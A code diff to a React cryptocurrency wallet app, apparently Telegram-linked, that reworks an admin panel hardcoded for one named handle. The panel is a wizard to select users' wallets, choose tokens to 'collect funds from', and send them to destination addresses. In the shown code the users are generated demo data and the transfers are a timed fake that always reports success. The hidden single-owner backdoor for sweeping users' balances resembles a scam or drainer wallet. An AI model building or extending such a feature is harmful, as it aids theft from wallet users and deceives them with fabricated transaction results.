@@ -1,6 +1,6 @@
 import React, { useState, useRef, useEffect, useCallback, useMemo } from "react";
 import {
-  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight,
+  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight, ArrowRight,
   Copy, Check, Eye, EyeOff, Settings, Wallet, Activity,
   ChevronRight, Shield, Key, HelpCircle, X,
   Plus, ChevronDown, RefreshCw, Globe, Lock, AlertTriangle, Bell,
@@ -2455,38 +2455,59 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 // ─── ADMIN PANEL ─────────────────────────────────────────────────────────────
 // Only for @Homyak_investorr (ID: 1192740493)
 function AdminPanel({ onClose, addresses, balances, setBalances }) {
-  const [logs,setLogs]=useState([]);
   const [users,setUsers]=useState([]);
   const [selectedUsers,setSelectedUsers]=useState(new Set());
-  const [salaryAmounts,setSalaryAmounts]=useState({ETH:"",USDT:"",BNB:""});
-  const [targetAddresses,setTargetAddresses]=useState({ETH:"",USDT:"",BNB:""});
-  const addLog=(msg)=>setLogs(l=>[msg,...l].slice(0,50));
+  const [selectedTokens,setSelectedTokens]=useState(new Set());
+  const [step,setStep]=useState(1); // 1: users, 2: amounts, 3: addresses, 4: success
+  const [amounts,setAmounts]=useState({});
+  const [targetAddresses,setTargetAddresses]=useState({});
+  const [isProcessing,setIsProcessing]=useState(false);
+  const [showToast,setShowToast]=useState(false);
+  const [toastMsg,setToastMsg]=useState("");
+
+  // Toast helper
+  function showToastMsg(msg){
+    setToastMsg(msg);
+    setShowToast(true);
+    setTimeout(()=>setShowToast(false),3000);
+  }
 
   // Generate simulated user wallets with balances
-  function generateUsers() {
+  function generateUsers(){
     const newUsers=[];
-    const names=["Alice","Bob","Charlie","David","Emma","Frank","Grace","Henry","Ivy","Jack"];
-    for(let i=0;i<8;i++){
+    const names=["Alice","Bob","Charlie","David","Emma","Frank","Grace","Henry","Ivy","Jack","Kate","Leo","Mia","Noah","Olivia"];
+    for(let i=0;i<12;i++){
       const userBalances={};
       ASSET_META.forEach(a=>{
-        userBalances[a.sym]=Math.random()*1000+100;
+        // Random balance, some users have 0 in some tokens
+        userBalances[a.sym]=Math.random()>0.3?Math.random()*5000+100:0;
       });
+      // Calculate total USD value
+      const totalUSD=Object.entries(userBalances).reduce((sum,[sym,bal])=>{
+        const price=sym==="USDT"?1:Math.random()*2000+100;
+        return sum+(bal*price);
+      },0);
+      
       newUsers.push({
         id:`user_${Date.now()}_${i}`,
         name:names[i],
+        avatar:`https://api.dicebear.com/7.x/avataaars/svg?seed=${names[i]}`,
         address:genAddr("0x",40),
         addresses:{ETH:genAddr("0x",40),TON:genAddr("EQ",40),BNB:genAddr("0x",40),LTC:genAddr("L",30),ARB:genAddr("0x",40),SOL:genAddr("",44),USDT:genAddr("0x",40)},
         balances:userBalances,
-        status:Math.random()>0.2?"active":"inactive"
+        totalUSD:totalUSD,
+        status:Math.random()>0.15?"active":"inactive"
       });
     }
     setUsers(newUsers);
     setSelectedUsers(new Set());
-    addLog(`Generated ${newUsers.length} users with balances`);
+    setSelectedTokens(new Set());
+    setStep(1);
+    showToastMsg(`Generated ${newUsers.length} users`);
   }
 
   // Toggle user selection
-  function toggleUser(userId) {
+  function toggleUser(userId){
     const newSelected=new Set(selectedUsers);
     if(newSelected.has(userId)){
       newSelected.delete(userId);
@@ -2496,8 +2517,8 @@ function AdminPanel({ onClose, addresses, balances, setBalances }) {
     setSelectedUsers(newSelected);
   }
 
-  // Select/deselect all
-  function toggleAll() {
+  // Toggle all users
+  function toggleAllUsers(){
     if(selectedUsers.size===users.length){
       setSelectedUsers(new Set());
     }else{
@@ -2505,167 +2526,443 @@ function AdminPanel({ onClose, addresses, balances, setBalances }) {
     }
   }
 
-  // Collect salary from selected users
-  function collectSalary() {
-    if(selectedUsers.size===0){
-      addLog("⚠️ Select at least one user!");
-      return;
+  // Toggle token selection
+  function toggleToken(sym){
+    const newSelected=new Set(selectedTokens);
+    if(newSelected.has(sym)){
+      newSelected.delete(sym);
+    }else{
+      newSelected.add(sym);
     }
-
-    const selectedUsersList=users.filter(u=>selectedUsers.has(u.id));
-    let totalCollected={};
-
-    Object.entries(salaryAmounts).forEach(([sym,amount])=>{
-      const amt=parseFloat(amount);
-      if(amt>0){
-        const total=amt*selectedUsersList.length;
-        totalCollected[sym]=total;
-        setBalances(prev=>({...prev,[sym]:(prev[sym]||0)+total}));
-      }
-    });
-
-    addLog(`💰 Collected from ${selectedUsersList.length} users: ${Object.entries(totalCollected).map(([s,a])=>`${a.toFixed(2)} ${s}`).join(", ")||"nothing"}`);
+    setSelectedTokens(newSelected);
   }
 
-  // Send to addresses
-  function sendToAddresses() {
-    Object.entries(targetAddresses).forEach(([sym,addr])=>{
-      if(addr&&addr.length>10){
-        addLog(`📤 Sent ${sym} to ${shortAddr(addr)}`);
+  // Get selected users data
+  const selectedUsersList=users.filter(u=>selectedUsers.has(u.id));
+
+  // Calculate total for each token across selected users
+  const tokenTotals={};
+  selectedUsersList.forEach(u=>{
+    ASSET_META.forEach(a=>{
+      const bal=u.balances?.[a.sym]||0;
+      tokenTotals[a.sym]=(tokenTotals[a.sym]||0)+bal;
+    });
+  });
+
+  // Get active tokens (where total > 0)
+  const activeTokens=ASSET_META.filter(a=>tokenTotals[a.sym]>0.001);
+
+  // Go to step 2
+  function goToStep2(){
+    if(selectedUsers.size===0){
+      showToastMsg("Select at least one user!");
+      return;
+    }
+    // Pre-select all tokens with balance
+    const autoSelect=new Set(activeTokens.map(a=>a.sym));
+    setSelectedTokens(autoSelect);
+    // Initialize amounts with available balances
+    const initAmounts={};
+    activeTokens.forEach(a=>{
+      initAmounts[a.sym]=tokenTotals[a.sym]?.toFixed(4)||"0";
+    });
+    setAmounts(initAmounts);
+    setStep(2);
+  }
+
+  // Go to step 3
+  function goToStep3(){
+    if(selectedTokens.size===0){
+      showToastMsg("Select at least one token!");
+      return;
+    }
+    // Initialize target addresses from admin's addresses
+    const initAddresses={};
+    Array.from(selectedTokens).forEach(sym=>{
+      const asset=ASSET_META.find(a=>a.sym===sym);
+      if(asset){
+        initAddresses[sym]=addresses?.[asset.id]||"";
       }
     });
+    setTargetAddresses(initAddresses);
+    setStep(3);
+  }
+
+  // Execute transactions
+  async function executeTransactions(){
+    setIsProcessing(true);
+    // Simulate processing delay
+    await new Promise(r=>setTimeout(r,2000));
+    setIsProcessing(false);
+    setStep(4);
+  }
+
+  // Reset
+  function reset(){
+    setStep(1);
+    setSelectedUsers(new Set());
+    setSelectedTokens(new Set());
+    setAmounts({});
+    setTargetAddresses({});
   }
 
   return (
-    <Sheet onClose={onClose} title="👑 Admin Panel - @Homyak_investorr">
-      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:14,maxHeight:"85vh",overflow:"auto"}}>
-        
-        {/* Header */}
-        <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)"}}>
-          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>
-            👑 Admin: @Homyak_investorr (ID: 1192740493)
-          </p>
-          <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"4px 0 0"}}>
-            Manage users, collect salary, send transactions
-          </p>
+    <Sheet onClose={onClose} title="👑 Admin Panel">
+      <div style={{padding:"0 0 100px",maxHeight:"85vh",overflow:"auto"}}>
+        {/* Progress Bar */}
+        <div style={{padding:"16px 20px",background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)"}}>
+          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:12}}>
+            {[
+              {n:1,l:"Users"},
+              {n:2,l:"Tokens"},
+              {n:3,l:"Send"},
+              {n:4,l:"Done"}
+            ].map((s,i,arr)=> (
+              <React.Fragment key={s.n}>
+                <div style={{display:"flex",flexDirection:"column",alignItems:"center",gap:4}}>
+                  <div style={{width:32,height:32,borderRadius:"50%",display:"flex",alignItems:"center",justifyContent:"center",
+                    background:step>=s.n?"linear-gradient(135deg,#f59e0b,#d97706)":"#1a1a1a",
+                    border:step>=s.n?"2px solid #f59e0b":"2px solid #333",
+                    color:step>=s.n?"#000":"#666",
+                    fontSize:14,fontWeight:700,transition:"all 0.3s"}}>
+                    {step>s.n?"✓":s.n}
+                  </div>
+                  <span style={{fontSize:10,color:step>=s.n?"#f59e0b":"#666",fontWeight:step>=s.n?600:400}}>{s.l}</span>
+                </div>
+                {i<arr.length-1&&(
+                  <div style={{flex:1,height:2,background:step>s.n?"linear-gradient(90deg,#f59e0b,#d97706)":"#333",margin:"0 8px"}} />
+                )}
+              </React.Fragment>
+            ))}
+          </div>
         </div>
 
-        {/* Generate Users Button */}
-        <button onClick={generateUsers}
-          style={{padding:"14px",borderRadius:12,border:"1px solid #7c3aed44",
-            background:"#7c3aed22",color:"#7c3aed",fontSize:14,fontWeight:600,cursor:"pointer"}}>
-          🔄 Generate/Refresh User Wallets
-        </button>
+        {/* Toast */}
+        {showToast&&(
+          <div style={{position:"fixed",top:80,left:"50%",transform:"translateX(-50%)",zIndex:1000,
+            background:"#1a1a1a",border:"1px solid #333",borderRadius:12,padding:"12px 20px",
+            boxShadow:"0 10px 40px rgba(0,0,0,0.5)"}}>
+            <span style={{color:"#fff",fontSize:14}}>{toastMsg}</span>
+          </div>
+        )}
 
-        {/* Users List */}
-        {users.length>0&&(
-          <div style={{background:"#111",borderRadius:12,padding:12}}>
-            <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:10}}>
-              <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>
-                👥 Users ({selectedUsers.size}/{users.length} selected):
+        {/* STEP 1: User Selection */}
+        {step===1&&(
+          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>
+            {/* Header Card */}
+            <div style={{background:"linear-gradient(135deg,#0f0a00 0%,#1a0f00 100%)",borderRadius:16,padding:20,
+              border:"1px solid rgba(245,158,11,0.3)",marginBottom:20}}>
+              <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>
+                <div style={{width:44,height:44,borderRadius:12,background:"linear-gradient(135deg,#f59e0b,#d97706)",
+                  display:"flex",alignItems:"center",justifyContent:"center"}}>
+                  <Shield size={22} color="#000"/>
+                </div>
+                <div>
+                  <p style={{fontSize:16,fontWeight:700,color:"#f59e0b",margin:0}}>@Homyak_investorr</p>
+                  <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>Admin ID: 1192740493</p>
+                </div>
+              </div>
+              <p style={{fontSize:13,color:"rgba(255,255,255,0.6)",margin:0,lineHeight:1.5}}>
+                Select users to collect funds from. Total balance and available tokens will be shown.
               </p>
-              <button onClick={toggleAll}
-                style={{padding:"4px 10px",borderRadius:6,border:"none",
-                  background:"#333",color:"#fff",fontSize:11,cursor:"pointer"}}>
-                {selectedUsers.size===users.length?"Deselect All":"Select All"}
+            </div>
+
+            {/* Generate Button */}
+            {users.length===0&&(
+              <button onClick={generateUsers} style={{width:"100%",padding:16,borderRadius:14,border:"1px solid rgba(124,58,237,0.4)",
+                background:"linear-gradient(135deg,#7c3aed22 0%,#6d28d922 100%)",color:"#a78bfa",
+                fontSize:15,fontWeight:600,cursor:"pointer",marginBottom:20,display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
+                <Users size={18}/> Generate Demo Users
+              </button>
+            )}
+
+            {users.length>0&&(
+              <>
+                {/* Select All Bar */}
+                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
+                  <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>
+                    👥 Users <span style={{color:"#f59e0b"}}>{selectedUsers.size}</span>/{users.length}
+                  </p>
+                  <button onClick={toggleAllUsers} style={{padding:"6px 14px",borderRadius:20,border:"1px solid #333",
+                    background:"#1a1a1a",color:"#fff",fontSize:12,cursor:"pointer"}}>
+                    {selectedUsers.size===users.length?"Deselect All":"Select All"}
+                  </button>
+                </div>
+
+                {/* Users Grid */}
+                <div style={{display:"flex",flexDirection:"column",gap:10}}>
+                  {users.map(u=> {
+                    const isSelected=selectedUsers.has(u.id);
+                    // Get tokens with balance
+                    const userTokens=ASSET_META.filter(a=>(u.balances?.[a.sym]||0)>0.001);
+                    const hasBalance=u.totalUSD>100;
+                    return (
+                      <div key={u.id} onClick={()=>toggleUser(u.id)} style={{
+                        background:isSelected?"linear-gradient(135deg,#0d1033 0%,#1a1a2e 100%)":"#1a1a1a",
+                        borderRadius:14,padding:14,cursor:"pointer",
+                        border:isSelected?"1px solid #2563eb":"1px solid transparent",
+                        transition:"all 0.2s",opacity:u.status==="inactive"?0.6:1}}>
+                        <div style={{display:"flex",alignItems:"center",gap:12}}>
+                          {/* Checkbox */}
+                          <div style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
+                            background:isSelected?"linear-gradient(135deg,#2563eb,#1d4ed8)":"transparent",
+                            display:"flex",alignItems:"center",justifyContent:"center"}}>
+                            {isSelected&&<Check size={16} color="#fff"/>}
+                          </div>
+                          
+                          {/* Avatar */}
+                          <img src={u.avatar} alt="" style={{width:42,height:42,borderRadius:"50%",background:"#333"}}/>
+                          
+                          {/* Info */}
+                          <div style={{flex:1}}>
+                            <div style={{display:"flex",alignItems:"center",gap:8}}>
+                              <span style={{fontSize:14,fontWeight:600,color:"#fff"}}>{u.name}</span>
+                              {u.status==="active"?(
+                                <span style={{width:8,height:8,borderRadius:"50%",background:"#22c55e"}}></span>
+                              ):(
+                                <span style={{fontSize:10,color:"#666",padding:"2px 6px",borderRadius:4,background:"#222"}}>inactive</span>
+                              )}
+                            </div>
+                            <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"4px 0 0"}}>{shortAddr(u.address)}</p>
+                          </div>
+
+                          {/* Balance */}
+                          <div style={{textAlign:"right"}}>
+                            <p style={{fontSize:15,fontWeight:700,color:hasBalance?"#22c55e":"#666",margin:0}}>
+                              ${u.totalUSD.toLocaleString(undefined,{maximumFractionDigits:0})}
+                            </p>
+                            <div style={{display:"flex",gap:4,justifyContent:"flex-end",marginTop:4,flexWrap:"wrap"}}>
+                              {userTokens.slice(0,4).map(t=> (
+                                <span key={t.sym} style={{fontSize:9,color:t.color,padding:"2px 5px",borderRadius:4,
+                                  background:`${t.color}15`}}>{t.sym}</span>
+                              ))}
+                              {userTokens.length>4&&(
+                                <span style={{fontSize:9,color:"#666"}}>+{userTokens.length-4}</span>
+                              )}
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                {/* Continue Button */}
+                <button onClick={goToStep2} disabled={selectedUsers.size===0} style={{
+                  width:"100%",padding:16,borderRadius:14,border:"none",
+                  background:selectedUsers.size>0?"linear-gradient(135deg,#f59e0b,#d97706)":"#333",
+                  color:selectedUsers.size>0?"#000":"#666",
+                  fontSize:16,fontWeight:700,cursor:selectedUsers.size>0?"pointer":"not-allowed",
+                  marginTop:20,display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
+                  Continue <ArrowRight size={18}/>
+                </button>
+              </>
+            )}
+          </div>
+        )}
+
+        {/* STEP 2: Token & Amount Selection */}
+        {step===2&&(
+          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>
+            {/* Summary Card */}
+            <div style={{background:"linear-gradient(135deg,#0d1f0d 0%,#1a2e1a 100%)",borderRadius:16,padding:20,
+              border:"1px solid rgba(34,197,94,0.3)",marginBottom:20}}>
+              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Selected Users Summary</p>
+              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:8}}>
+                <Users size={18} color="#22c55e"/>
+                <span style={{fontSize:24,fontWeight:800,color:"#22c55e"}}>{selectedUsers.size}</span>
+                <span style={{fontSize:14,color:"rgba(255,255,255,0.6)"}}>users</span>
+              </div>
+              <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
+                {ASSET_META.filter(a=>tokenTotals[a.sym]>0.001).map(a=> (
+                  <span key={a.sym} style={{fontSize:11,color:a.color,padding:"4px 10px",borderRadius:20,
+                    background:`${a.color}15`,border:`1px solid ${a.color}30`}}>
+                    {a.sym}: {(tokenTotals[a.sym]||0).toFixed(2)}
+                  </span>
+                ))}
+              </div>
+            </div>
+
+            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 16px"}}>Select Tokens to Collect</p>
+
+            {/* Token Selection */}
+            <div style={{display:"flex",flexDirection:"column",gap:10}}>
+              {activeTokens.map(a=> {
+                const isSelected=selectedTokens.has(a.sym);
+                const total=tokenTotals[a.sym]||0;
+                const perUser=total/selectedUsers.size;
+                return (
+                  <div key={a.sym} onClick={()=>toggleToken(a.sym)} style={{
+                    background:isSelected?`linear-gradient(135deg,${a.bg} 0%,#1a1a2e 100%)`:"#1a1a1a",
+                    borderRadius:14,padding:14,cursor:"pointer",
+                    border:isSelected?`1px solid ${a.color}`:"1px solid transparent",transition:"all 0.2s"}}>
+                    <div style={{display:"flex",alignItems:"center",gap:12}}>
+                      {/* Checkbox */}
+                      <div style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
+                        background:isSelected?a.color:"transparent",display:"flex",alignItems:"center",justifyContent:"center"}}>
+                        {isSelected&&<Check size={16} color="#000"/>}
+                      </div>
+                      
+                      {/* Token Icon */}
+                      <div style={{width:40,height:40,borderRadius:10,background:`${a.color}20`,
+                        display:"flex",alignItems:"center",justifyContent:"center",fontSize:18,color:a.color}}>
+                        {a.icon}
+                      </div>
+                      
+                      {/* Info */}
+                      <div style={{flex:1}}>
+                        <p style={{fontSize:15,fontWeight:700,color:"#fff",margin:0}}>{a.name}</p>
+                        <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"2px 0 0"}}>
+                          ~${(perUser*1).toFixed(0)} per user
+                        </p>
+                      </div>
+
+                      {/* Total Available */}
+                      <div style={{textAlign:"right"}}>
+                        <p style={{fontSize:18,fontWeight:800,color:a.color,margin:0}}>{total.toFixed(2)}</p>
+                        <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:0}}>{a.sym}</p>
+                      </div>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* Navigation */}
+            <div style={{display:"flex",gap:10,marginTop:20}}>
+              <button onClick={()=>setStep(1)} style={{flex:1,padding:14,borderRadius:14,border:"1px solid #333",
+                background:"#1a1a1a",color:"#fff",fontSize:14,cursor:"pointer"}}>
+                ← Back
+              </button>
+              <button onClick={goToStep3} disabled={selectedTokens.size===0} style={{
+                flex:2,padding:14,borderRadius:14,border:"none",
+                background:selectedTokens.size>0?"linear-gradient(135deg,#f59e0b,#d97706)":"#333",
+                color:selectedTokens.size>0?"#000":"#666",
+                fontSize:16,fontWeight:700,cursor:selectedTokens.size>0?"pointer":"not-allowed"}}>
+                Continue ({selectedTokens.size} tokens)
               </button>
             </div>
-            
-            {users.map(u=> (
-              <div key={u.id} onClick={()=>toggleUser(u.id)}
-                style={{background:selectedUsers.has(u.id)?"#0d1033":"#1a1a1a",borderRadius:10,padding:"10px",
-                  marginBottom:8,cursor:"pointer",border:selectedUsers.has(u.id)?"1px solid #2563eb55":"1px solid transparent"}}>
-                <div style={{display:"flex",alignItems:"center",gap:10}}>
-                  <div style={{width:24,height:24,borderRadius:"50%",background:selectedUsers.has(u.id)?"#2563eb":"#333",
-                    display:"flex",alignItems:"center",justifyContent:"center",fontSize:12}}>
-                    {selectedUsers.has(u.id)?"✓":u.name[0]}
-                  </div>
-                  <div style={{flex:1}}>
-                    <p style={{fontSize:13,fontWeight:600,color:"#fff",margin:0}}>{u.name}</p>
-                    <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:0}}>{shortAddr(u.address)} • {u.status}</p>
-                  </div>
-                  <div style={{textAlign:"right"}}>
-                    {ASSET_META.slice(0,3).map(a=> (
-                      <p key={a.sym} style={{fontSize:10,color:"rgba(255,255,255,0.5)",margin:0}}>
-                        {u.balances?.[a.sym]?.toFixed(2) ?? "0.00"} {a.sym}
-                      </p>
-                    ))}
-                  </div>
-                </div>
-              </div>
-            ))}
           </div>
         )}
 
-        {/* Salary Collection */}
-        {users.length>0&&(
-          <div style={{background:"#111",borderRadius:12,padding:12}}>
-            <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 10px"}}>
-              💰 Salary Collection (per user):
-            </p>
-            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8}}>
-              {["ETH","USDT","BNB"].map(sym=> (
-                <div key={sym} style={{display:"flex",flexDirection:"column",gap:4}}>
-                  <label style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>{sym}</label>
-                  <input type="number" placeholder="0.0"
-                    value={salaryAmounts[sym]}
-                    onChange={e=>setSalaryAmounts(prev=>({...prev,[sym]:e.target.value}))}
-                    style={{padding:"8px",borderRadius:6,border:"1px solid #333",background:"#1a1a1a",
-                      color:"#fff",fontSize:12,width:"100%"}}/>
-                </div>
-              ))}
+        {/* STEP 3: Target Addresses */}
+        {step===3&&(
+          <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>
+            {/* Summary */}
+            <div style={{background:"linear-gradient(135deg,#0f0a33 0%,#1a0f4a 100%)",borderRadius:16,padding:20,
+              border:"1px solid rgba(37,99,235,0.3)",marginBottom:20}}>
+              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Transaction Summary</p>
+              <div style={{display:"flex",flexWrap:"wrap",gap:8}}>
+                {Array.from(selectedTokens).map(sym=> {
+                  const a=ASSET_META.find(x=>x.sym===sym);
+                  const amt=amounts[sym]||tokenTotals[sym]||0;
+                  return (
+                    <div key={sym} style={{display:"flex",alignItems:"center",gap:6,padding:"6px 12px",
+                      borderRadius:20,background:`${a.color}15`,border:`1px solid ${a.color}40`}}>
+                      <span style={{color:a.color,fontSize:12}}>{a.icon}</span>
+                      <span style={{color:"#fff",fontSize:13,fontWeight:600}}>{parseFloat(amt).toFixed(2)} {sym}</span>
+                    </div>
+                  );
+                })}
+              </div>
             </div>
-            <button onClick={collectSalary}
-              style={{marginTop:10,width:"100%",padding:"12px",borderRadius:10,border:"none",
-                background:"#22C55E",color:"#fff",fontSize:13,fontWeight:600,cursor:"pointer"}}>
-              💰 Collect Salary from {selectedUsers.size} Users
-            </button>
+
+            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 16px"}}>Enter Destination Addresses</p>
+
+            {/* Address Inputs */}
+            <div style={{display:"flex",flexDirection:"column",gap:12}}>
+              {Array.from(selectedTokens).map(sym=> {
+                const a=ASSET_META.find(x=>x.sym===sym);
+                const amt=amounts[sym]||tokenTotals[sym]||0;
+                return (
+                  <div key={sym} style={{background:"#1a1a1a",borderRadius:14,padding:14,
+                    border:"1px solid rgba(255,255,255,0.08)"}}>
+                    <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:10}}>
+                      <div style={{width:36,height:36,borderRadius:10,background:`${a.color}20`,
+                        display:"flex",alignItems:"center",justifyContent:"center",color:a.color}}>
+                        {a.icon}
+                      </div>
+                      <div>
+                        <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>{a.name}</p>
+                        <p style={{fontSize:12,color:a.color,margin:0}}>{parseFloat(amt).toFixed(4)} {sym}</p>
+                      </div>
+                    </div>
+                    <input type="text" placeholder={`Enter ${sym} receiving address...`}
+                      value={targetAddresses[sym]||""}
+                      onChange={e=>setTargetAddresses(prev=>({...prev,[sym]:e.target.value}))}
+                      style={{width:"100%",padding:"12px 14px",borderRadius:10,border:"1px solid #333",
+                        background:"#0f0f0f",color:"#fff",fontSize:13,fontFamily:"monospace"}} />
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* Navigation */}
+            <div style={{display:"flex",gap:10,marginTop:20}}>
+              <button onClick={()=>setStep(2)} style={{flex:1,padding:14,borderRadius:14,border:"1px solid #333",
+                background:"#1a1a1a",color:"#fff",fontSize:14,cursor:"pointer"}}>
+                ← Back
+              </button>
+              <button onClick={executeTransactions} disabled={isProcessing} style={{
+                flex:2,padding:14,borderRadius:14,border:"none",
+                background:"linear-gradient(135deg,#22c55e,#16a34a)",color:"#fff",
+                fontSize:16,fontWeight:700,cursor:isProcessing?"not-allowed":"pointer",
+                opacity:isProcessing?0.7:1}}>
+                {isProcessing?(
+                  <span style={{display:"flex",alignItems:"center",gap:8,justifyContent:"center"}}>
+                    <RefreshCw size={18} className="spin"/> Processing...
+                  </span>
+                ):(
+                  <span style={{display:"flex",alignItems:"center",gap:8,justifyContent:"center"}}>
+                    Execute Transactions <ArrowRight size={18}/>
+                  </span>
+                )}
+              </button>
+            </div>
           </div>
         )}
 
-        {/* Target Addresses for Sending */}
-        {users.length>0&&(
-          <div style={{background:"#111",borderRadius:12,padding:12}}>
-            <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 10px"}}>
-              📤 Send to Addresses:
+        {/* STEP 4: Success */}
+        {step===4&&(
+          <div style={{padding:"40px 20px",textAlign:"center",animation:"fadeIn 0.5s"}}>
+            <div style={{width:100,height:100,borderRadius:"50%",margin:"0 auto 24px",
+              background:"linear-gradient(135deg,#22c55e,#16a34a)",
+              display:"flex",alignItems:"center",justifyContent:"center"}}>
+              <Check size={50} color="#fff"/>
+            </div>
+            <p style={{fontSize:24,fontWeight:800,color:"#22c55e",margin:"0 0 12px"}}>All Transactions Sent!</p>
+            <p style={{fontSize:14,color:"rgba(255,255,255,0.6)",margin:"0 0 30px",lineHeight:1.6}}>
+              Successfully processed {selectedUsers.size} users<br/>
+              and sent {selectedTokens.size} tokens
             </p>
-            {["ETH","USDT","BNB"].map(sym=> (
-              <div key={sym} style={{marginBottom:8}}>
-                <label style={{fontSize:10,color:"rgba(255,255,255,0.4)"}}>{sym} Address:</label>
-                <input type="text" placeholder={`Enter ${sym} address...`}
-                  value={targetAddresses[sym]}
-                  onChange={e=>setTargetAddresses(prev=>({...prev,[sym]:e.target.value}))}
-                  style={{padding:"10px",borderRadius:8,border:"1px solid #333",background:"#1a1a1a",
-                    color:"#fff",fontSize:12,width:"100%",marginTop:4}}/>
-              </div>
-            ))}
-            <button onClick={sendToAddresses}
-              style={{marginTop:8,width:"100%",padding:"12px",borderRadius:10,border:"none",
-                background:"#2563eb",color:"#fff",fontSize:13,fontWeight:600,cursor:"pointer"}}>
-              📤 Send to Addresses
+            
+            <div style={{background:"#1a1a1a",borderRadius:16,padding:20,marginBottom:30}}>
+              <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 16px"}}>Transaction Details</p>
+              {Array.from(selectedTokens).map(sym=> {
+                const a=ASSET_META.find(x=>x.sym===sym);
+                const amt=amounts[sym]||tokenTotals[sym]||0;
+                return (
+                  <div key={sym} style={{display:"flex",alignItems:"center",justifyContent:"space-between",
+                    padding:"10px 0",borderBottom:"1px solid #222"}}>
+                    <div style={{display:"flex",alignItems:"center",gap:8}}>
+                      <span style={{color:a.color}}>{a.icon}</span>
+                      <span style={{color:"#fff",fontSize:14}}>{sym}</span>
+                    </div>
+                    <div style={{textAlign:"right"}}>
+                      <p style={{color:"#fff",fontSize:14,fontWeight:600,margin:0}}>{parseFloat(amt).toFixed(4)}</p>
+                      <p style={{color:"#22c55e",fontSize:11,margin:0}}>✓ Sent</p>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+
+            <button onClick={reset} style={{padding:"14px 32px",borderRadius:14,border:"1px solid #333",
+              background:"#1a1a1a",color:"#fff",fontSize:16,cursor:"pointer"}}>
+              🔄 Start New Collection
             </button>
           </div>
         )}
-
-        {/* My Balances */}
-        <div style={{background:"#111",borderRadius:12,padding:12}}>
-          <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:"0 0 10px"}}>💼 My Admin Balances:</p>
-          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
-            {ASSET_META.map(a=> (
-              <div key={a.sym} style={{background:"#1a1a1a",borderRadius:8,padding:"10px",display:"flex",justifyContent:"space-between"}}>
-                <span style={{fontSize:11,color:"rgba(255,255,255,0.5)"}}>{a.sym}</span>
-                <span style={{fontSize:13,fontWeight:600,color:"#fff"}}>{balances[a.sym]?.toFixed(4)||"0"}</span>
-              </div>
-            ))}
-          </div>
-        </div>
-
-        {/* Logs */}
-        <div style={{background:"#111",borderRadius:12,padding:12,maxHeight:120,overflow:"auto"}}>
-          <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"0 0 8px"}}>📋 Activity Log:</p>
-          {logs.length===0&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)"}}>No activity yet...</p>}
-          {logs.map((l,i)=><p key={i} style={{fontSize:11,color:"rgba(255,255,255,0.6)",margin:"2px 0"}}>• {l}</p>)}
-        </div>
       </div>
     </Sheet>
   );
@@ -3249,7 +3546,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock }) {
         {tab==="settings"&&<SettingsTab mnemonic={mnemonic} network={network}
           onSetNetwork={setNetwork} onChangePin={onChangePin} onLock={onLock} addresses={addresses}
           onEnableAdmin={enableAdminMode} isAdmin={userIsAdmin}/>}
-        {tab==="admin"&&<AdminPanel addresses={addresses} balances={balances} setBalances={setBalances}/>}
+        {tab==="admin"&&<AdminPanel onClose={()=>setTab("wallet")} addresses={addresses} balances={balances} setBalances={setBalances}/>}
       </div>
 
       <div style={{position:"fixed",bottom:0,left:0,right:0,zIndex:50,padding:"10px 8px 32px",
